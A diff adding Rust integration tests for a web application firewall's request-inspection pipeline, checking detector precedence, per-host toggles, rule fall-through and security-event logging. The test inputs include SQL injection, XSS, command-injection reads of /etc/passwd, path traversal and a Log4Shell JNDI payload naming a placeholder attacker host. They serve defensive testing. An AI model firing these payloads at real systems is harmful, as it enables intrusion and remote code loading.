@@ -29,8 +29,15 @@ use std::sync::Arc;
 
 use bytes::Bytes;
 use waf_common::{HostConfig, Phase, RequestCtx, WafAction};
-use waf_engine::{WafEngine, WafEngineConfig};
+use waf_engine::crowdsec::{
+    AppSecClient, AppSecConfig, CrowdSecChecker, CrowdSecConfig, DecisionCache, FallbackAction,
+};
+use waf_engine::rules::engine::{
+    Condition, ConditionField, ConditionOp, ConditionValue, CustomRule, Operator, RuleAction,
+};
+use waf_engine::{CommunityClient, CommunityReporter, WafEngine, WafEngineConfig};
 use waf_storage::Database;
+use waf_storage::models::SecurityEventQuery;
 
 fn database_url() -> String {
     std::env::var("DATABASE_URL").unwrap_or_else(|_| "postgresql://prx_waf:prx_waf@127.0.0.1:15432/prx_waf".to_string())
@@ -186,4 +193,476 @@ async fn entrypoint_parity_same_ctx_same_decision() {
     let mut d = make_ctx("q=hello", "", false);
     assert!(eng.inspect(&mut c).await.is_allowed());
     assert!(eng.inspect(&mut d).await.is_allowed());
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// G0.1 — production entry-point gate (four-review must-fix #2).
+//
+// These tests drive the REAL `WafEngine::inspect` / `inspect_body` so the G1
+// subsystem swap is proven at the production entry, not against a test-authored
+// vector. They cover:
+//   • four-checker precedence + each single hit through the real engine;
+//   • per-host toggles at the production entry;
+//   • POSITIVE fall-through: legacy `None` continues to AppSec / custom (three
+//     states) / OWASP CRS / sensitive — i.e. `None` is never silently turned
+//     into an early Allow;
+//   • legacy-vs-suffix precedence (legacy wins);
+//   • ORIGINAL side effects: a Block and a host-LogOnly persist a
+//     security_event; a legacy Block with report_community=true reaches the
+//     community reporter (observed via a real in-process HTTP sink).
+// All require a live `WafEngine` (DB-backed), hence `#[ignore]` + Postgres,
+// mirroring the file's existing gate.
+// ══════════════════════════════════════════════════════════════════════════════
+
+/// Install the process-level rustls `ring` `CryptoProvider` once, mirroring
+/// production `prx-waf` startup. Required before any reqwest client is built
+/// (reqwest uses `rustls-no-provider`), for the `AppSec` and community paths.
+fn ensure_crypto_provider() {
+    // `install_default` returns Err only if already installed — idempotent here.
+    let _ = rustls::crypto::ring::default_provider().install_default();
+}
+
+/// Engine plus a handle to the same `Database` (for security-event assertions).
+async fn engine_with_db() -> (WafEngine, Arc<Database>) {
+    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
+    db.migrate().await.expect("migrate");
+    let eng = WafEngine::new(Arc::clone(&db), WafEngineConfig::default());
+    (eng, db)
+}
+
+/// A benign-UA ctx with a caller-chosen client IP and host code; all defenses
+/// default on. Callers mutate `path`/`query`/`body_preview` and (via
+/// `Arc::make_mut`) `host_config` as needed.
+fn base_ctx(ip: &str, code: &str) -> RequestCtx {
+    let host_config = Arc::new(HostConfig {
+        code: code.to_string(),
+        host: "example.com".to_string(),
+        guard_status: true,
+        ..HostConfig::default()
+    });
+    let mut headers = HashMap::new();
+    headers.insert("user-agent".to_string(), "Mozilla/5.0 (g01-parity)".to_string());
+    RequestCtx {
+        req_id: "g01".to_string(),
+        client_ip: ip.parse().expect("valid ip"),
+        client_port: 40000,
+        method: "GET".to_string(),
+        host: "example.com".to_string(),
+        port: 80,
+        path: "/".to_string(),
+        query: String::new(),
+        headers,
+        body_preview: Bytes::new(),
+        content_length: 0,
+        is_tls: false,
+        host_config,
+        geo: None,
+    }
+}
+
+fn set_body(ctx: &mut RequestCtx, body: &str) {
+    ctx.body_preview = Bytes::from(body.to_string());
+    ctx.content_length = body.len() as u64;
+}
+
+/// Build the *narrow* security-event filter used by the side-effect assertions:
+/// `host_code` + `client_ip` + `rule_name` + `action` together. Narrowing to the
+/// exact rule keeps an unrelated row (a different rule from another test, or a
+/// stale row from a prior run on a non-clean DB) from inflating the count.
+fn event_query(host_code: &str, ip: &str, rule_name: &str, action: &str) -> SecurityEventQuery {
+    SecurityEventQuery {
+        host_code: Some(host_code.to_string()),
+        client_ip: Some(ip.to_string()),
+        rule_name: Some(rule_name.to_string()),
+        action: Some(action.to_string()),
+        country: None,
+        iso_code: None,
+        page: None,
+        page_size: None,
+    }
+}
+
+/// Current `security_events` row count for `query`.
+async fn event_total(db: &Database, query: &SecurityEventQuery) -> i64 {
+    let (_, total) = db.list_security_events(query).await.expect("list security events");
+    total
+}
+
+/// Poll `security_events` (written fire-and-forget via `tokio::spawn`) until the
+/// count for `query` **strictly exceeds** `baseline` — i.e. *this* request wrote
+/// a NEW row — or the retry budget is exhausted. Returns the last observed
+/// total; the caller asserts `> baseline`. Because the baseline is read *before*
+/// the request under test, a non-clean database full of history rows can never
+/// false-green the assertion: only a fresh row lifts the count past `baseline`.
+async fn wait_for_new_event(db: &Database, query: &SecurityEventQuery, baseline: i64) -> i64 {
+    let mut total = baseline;
+    for _ in 0..40 {
+        total = event_total(db, query).await;
+        if total > baseline {
+            return total;
+        }
+        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+    }
+    total
+}
+
+fn path_rule(id: &str, prefix: &str, action: RuleAction, status: u16, msg: Option<String>) -> CustomRule {
+    CustomRule {
+        id: id.to_string(),
+        host_code: "h1".to_string(),
+        name: format!("g01-{id}"),
+        priority: 1,
+        enabled: true,
+        condition_op: ConditionOp::And,
+        conditions: vec![Condition {
+            field: ConditionField::Path,
+            operator: Operator::StartsWith,
+            value: ConditionValue::Str(prefix.to_string()),
+        }],
+        action,
+        action_status: status,
+        action_msg: msg,
+        script: None,
+        regex_cache: Vec::new(),
+    }
+}
+
+// ── Four-checker precedence + single hits through the REAL engine ─────────────
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn entry_precedence_xss_over_rce_and_traversal() {
+    let (eng, _db) = engine_with_db().await;
+    // No SQLi; trips XSS (<script>), RCE (/etc/passwd) and Traversal (../, /etc).
+    let mut ctx = base_ctx("198.51.100.20", "h1");
+    ctx.query = "q=<script></script>;cat /etc/passwd ../".to_string();
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("r").phase, Phase::Xss);
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn entry_precedence_rce_over_traversal() {
+    let (eng, _db) = engine_with_db().await;
+    // No SQLi/XSS; trips RCE (;cat /etc/passwd) and Traversal (../, /etc).
+    let mut ctx = base_ctx("198.51.100.21", "h1");
+    ctx.query = "file=;cat /etc/passwd ../".to_string();
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("r").phase, Phase::Rce);
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn entry_single_hits_each_checker() {
+    let (eng, _db) = engine_with_db().await;
+
+    let mut sqli = base_ctx("198.51.100.22", "h1");
+    sqli.query = "id=1 union select 1,2,3".to_string();
+    assert_eq!(
+        eng.inspect_body(&mut sqli).await.result.expect("sqli").phase,
+        Phase::SqlInjection
+    );
+
+    let mut xss = base_ctx("198.51.100.23", "h1");
+    xss.query = "q=<script>alert(1)</script>".to_string();
+    assert_eq!(eng.inspect_body(&mut xss).await.result.expect("xss").phase, Phase::Xss);
+
+    let mut rce = base_ctx("198.51.100.24", "h1");
+    set_body(&mut rce, "cmd=$(id)");
+    assert_eq!(eng.inspect_body(&mut rce).await.result.expect("rce").phase, Phase::Rce);
+
+    // Pure traversal (no /etc, no shell) → traversal is the only hit.
+    let mut trav = base_ctx("198.51.100.25", "h1");
+    trav.path = "/a/../../b".to_string();
+    assert_eq!(
+        eng.inspect_body(&mut trav).await.result.expect("trav").phase,
+        Phase::DirTraversal
+    );
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn entry_host_toggles_disable_each_checker() {
+    let (eng, _db) = engine_with_db().await;
+
+    // Isolate the legacy detector under test: turn OWASP + sensitive off so the
+    // *only* possible match is the toggled checker. With it off, the request
+    // must fall through to Allow.
+    let make = |ip: &str| {
+        let mut c = base_ctx(ip, "h1");
+        let dc = &mut Arc::make_mut(&mut c.host_config).defense_config;
+        dc.owasp_set = false;
+        dc.sensitive = false;
+        c
+    };
+
+    let mut sqli = make("198.51.100.30");
+    Arc::make_mut(&mut sqli.host_config).defense_config.sqli = false;
+    sqli.query = "id=1 union select 1,2,3".to_string();
+    assert!(
+        eng.inspect_body(&mut sqli).await.is_allowed(),
+        "sqli toggle off must allow"
+    );
+
+    let mut xss = make("198.51.100.31");
+    Arc::make_mut(&mut xss.host_config).defense_config.xss = false;
+    xss.query = "q=<script>alert(1)</script>".to_string();
+    assert!(
+        eng.inspect_body(&mut xss).await.is_allowed(),
+        "xss toggle off must allow"
+    );
+
+    let mut rce = make("198.51.100.32");
+    Arc::make_mut(&mut rce.host_config).defense_config.rce = false;
+    set_body(&mut rce, "cmd=$(id)");
+    assert!(
+        eng.inspect_body(&mut rce).await.is_allowed(),
+        "rce toggle off must allow"
+    );
+
+    let mut trav = make("198.51.100.33");
+    Arc::make_mut(&mut trav.host_config).defense_config.dir_traversal = false;
+    trav.path = "/a/../../b".to_string();
+    assert!(
+        eng.inspect_body(&mut trav).await.is_allowed(),
+        "traversal toggle off must allow"
+    );
+}
+
+// ── POSITIVE fall-through: legacy `None` reaches the suffix pipeline ──────────
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_appsec_unavailable_blocks_when_failclosed() {
+    ensure_crypto_provider();
+    let (eng, _db) = engine_with_db().await;
+    // AppSec configured with an unreachable endpoint + fail-closed. A clean
+    // request → subsystem `None` → AppSec runs → Unavailable → Block. Proves the
+    // subsystem does not short-circuit past AppSec on `None`.
+    let cache = Arc::new(DecisionCache::new(0));
+    let checker = Arc::new(CrowdSecChecker::new(cache, CrowdSecConfig::default()));
+    let appsec = Arc::new(
+        AppSecClient::new(AppSecConfig {
+            endpoint: "http://127.0.0.1:9/appsec".to_string(), // discard port → refused fast
+            api_key: String::new(),
+            timeout_ms: 200,
+            failure_action: FallbackAction::Block,
+        })
+        .expect("appsec client"),
+    );
+    eng.set_crowdsec(checker, Some(appsec));
+
+    let mut ctx = base_ctx("198.51.100.40", "h1");
+    ctx.query = "q=hello".to_string();
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(
+        matches!(d.action, WafAction::Block { .. }),
+        "fail-closed AppSec must Block"
+    );
+    let r = d.result.expect("appsec result");
+    assert_eq!(r.phase, Phase::CrowdSec);
+    assert_eq!(r.rule_id.as_deref(), Some("crowdsec:appsec-unavailable"));
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_custom_allow_short_circuits_before_sensitive() {
+    let (eng, _db) = engine_with_db().await;
+    eng.custom_rules
+        .add_rule(path_rule("allow-me", "/allow-me", RuleAction::Allow, 200, None));
+
+    // Body carries a sensitive pattern that WOULD block if the pipeline reached
+    // sensitive; the custom Allow must short-circuit first → request allowed.
+    let mut ctx = base_ctx("198.51.100.41", "h1");
+    ctx.path = "/allow-me".to_string();
+    set_body(&mut ctx, "-----BEGIN RSA PRIVATE KEY-----");
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Allow), "custom Allow must short-circuit");
+    assert!(d.is_allowed());
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_custom_log_continues_to_sensitive() {
+    let (eng, _db) = engine_with_db().await;
+    eng.custom_rules
+        .add_rule(path_rule("log-me", "/log-me", RuleAction::Log, 403, None));
+
+    // Custom Log records + continues; the sensitive pattern in the body then
+    // blocks. Proves Log does NOT short-circuit the suffix pipeline.
+    let mut ctx = base_ctx("198.51.100.42", "h1");
+    ctx.path = "/log-me".to_string();
+    set_body(&mut ctx, "-----BEGIN RSA PRIVATE KEY-----");
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("sensitive").phase, Phase::Sensitive);
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_custom_block_uses_custom_status() {
+    let (eng, _db) = engine_with_db().await;
+    eng.custom_rules.add_rule(path_rule(
+        "block-me",
+        "/block-me",
+        RuleAction::Block,
+        418,
+        Some("nope".to_string()),
+    ));
+
+    let mut ctx = base_ctx("198.51.100.43", "h1");
+    ctx.path = "/block-me".to_string();
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(
+        matches!(d.action, WafAction::Block { status: 418, .. }),
+        "custom Block must use its configured status, got {:?}",
+        d.action
+    );
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_crs_only_blocks_by_owasp() {
+    let (eng, _db) = engine_with_db().await;
+    // Log4shell payload: not a legacy four-checker hit, caught only by OWASP CRS.
+    let mut ctx = base_ctx("198.51.100.44", "h1");
+    set_body(&mut ctx, "${jndi:ldap://evil.example/a}");
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("owasp").phase, Phase::Owasp);
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn fallthrough_sensitive_only_blocks_by_sensitive() {
+    let (eng, _db) = engine_with_db().await;
+    // Built-in sensitive pattern in the body: no legacy / CRS hit → sensitive.
+    let mut ctx = base_ctx("198.51.100.45", "h1");
+    set_body(&mut ctx, "leaking -----BEGIN RSA PRIVATE KEY----- here");
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("sensitive").phase, Phase::Sensitive);
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn precedence_legacy_wins_over_sensitive_suffix() {
+    let (eng, _db) = engine_with_db().await;
+    // Body trips BOTH legacy SQLi (union select) and sensitive (private key).
+    // The subsystem runs first → the decision is SQL Injection, not Sensitive.
+    let mut ctx = base_ctx("198.51.100.46", "h1");
+    set_body(&mut ctx, "id=1 union select 1,2,3 -----BEGIN RSA PRIVATE KEY-----");
+    let d = eng.inspect_body(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert_eq!(d.result.expect("legacy wins").phase, Phase::SqlInjection);
+}
+
+// ── ORIGINAL side effects preserved by the typed-verdict dispatch ─────────────
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn side_effect_block_persists_security_event() {
+    let (eng, db) = engine_with_db().await;
+    let ip = "203.0.113.10";
+    // Narrow filter (host + ip + rule + action) and a pre-request baseline: only
+    // a NEW row from THIS request can satisfy the assertion, so a non-clean DB
+    // with historical rows for the same ip/action cannot false-green it.
+    let query = event_query("h1", ip, "SQL Injection", "block");
+    let baseline = event_total(&db, &query).await;
+    let mut ctx = base_ctx(ip, "h1");
+    ctx.query = "id=1 union select 1,2,3".to_string();
+    let d = eng.inspect(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::Block { .. }));
+    assert!(
+        wait_for_new_event(&db, &query, baseline).await > baseline,
+        "a legacy Block must persist a NEW 'block' security_event (baseline {baseline})"
+    );
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn side_effect_host_log_only_persists_logonly_event() {
+    let (eng, db) = engine_with_db().await;
+    let ip = "203.0.113.11";
+    // Same baseline-delta guard as the block case, narrowed to the log_only row.
+    let query = event_query("h1", ip, "SQL Injection", "log_only");
+    let baseline = event_total(&db, &query).await;
+    let mut ctx = base_ctx(ip, "h1");
+    Arc::make_mut(&mut ctx.host_config).log_only_mode = true;
+    ctx.query = "id=1 union select 1,2,3".to_string();
+    let d = eng.inspect(&mut ctx).await;
+    assert!(matches!(d.action, WafAction::LogOnly), "host log_only must downgrade");
+    assert!(
+        wait_for_new_event(&db, &query, baseline).await > baseline,
+        "a host-LogOnly legacy hit must persist a NEW 'log_only' security_event (baseline {baseline})"
+    );
+}
+
+#[tokio::test]
+#[ignore = "requires live Postgres; run with --ignored"]
+async fn side_effect_legacy_block_reaches_community_reporter() {
+    use std::io::{Read, Write};
+
+    ensure_crypto_provider();
+    let (eng, _db) = engine_with_db().await;
+
+    // A minimal one-shot HTTP sink that captures the reporter's POST. Serves as
+    // the observable seam demanded by the four-review must-fix (no code-reading).
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind sink");
+    let addr = listener.local_addr().expect("addr");
+    let (tx, rx) = std::sync::mpsc::channel::<String>();
+    std::thread::spawn(move || {
+        if let Ok((mut stream, _)) = listener.accept() {
+            stream
+                .set_read_timeout(Some(std::time::Duration::from_millis(500)))
+                .ok();
+            let mut buf = Vec::new();
+            let mut chunk = [0u8; 4096];
+            // Read until the read-timeout fires (Err) so the full request+body
+            // is captured regardless of TCP segmentation.
+            while let Ok(n) = stream.read(&mut chunk) {
+                match chunk.get(..n) {
+                    Some(slice) if n > 0 => buf.extend_from_slice(slice),
+                    _ => break,
+                }
+            }
+            let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+            let _ = tx.send(String::from_utf8_lossy(&buf).into_owned());
+        }
+    });
+
+    let client = Arc::new(CommunityClient::new(&format!("http://{addr}")).expect("community client"));
+    let reporter = Arc::new(CommunityReporter::new(client, "test-key".to_string(), 1, 1));
+    eng.set_community_reporter(Arc::clone(&reporter));
+    let (_shutdown_tx, shutdown_rx) = tokio::sync::watch::channel(false);
+    tokio::spawn(Arc::clone(&reporter).run_flush_task(shutdown_rx));
+
+    // A legacy SQLi hit → record_block(.., report_community = true) → reporter.
+    let mut ctx = base_ctx("203.0.113.12", "h1");
+    ctx.query = "id=1 union select 1,2,3".to_string();
+    assert!(matches!(eng.inspect(&mut ctx).await.action, WafAction::Block { .. }));
+
+    // Poll with async sleeps (never block the runtime) so the spawned flush task
+    // gets to run on a current-thread runtime.
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
+    let captured = loop {
+        match rx.try_recv() {
+            Ok(s) => break s,
+            Err(std::sync::mpsc::TryRecvError::Empty) => {
+                assert!(
+                    std::time::Instant::now() < deadline,
+                    "community reporter must POST the signal within the deadline"
+                );
+                tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+            }
+            Err(std::sync::mpsc::TryRecvError::Disconnected) => panic!("sink thread ended without a POST"),
+        }
+    };
+    assert!(captured.contains("/api/v1/waf/signals"), "POST target path: {captured}");
+    assert!(
+        captured.contains("SQL Injection"),
+        "signal payload must carry the legacy rule name: {captured}"
+    );
 }
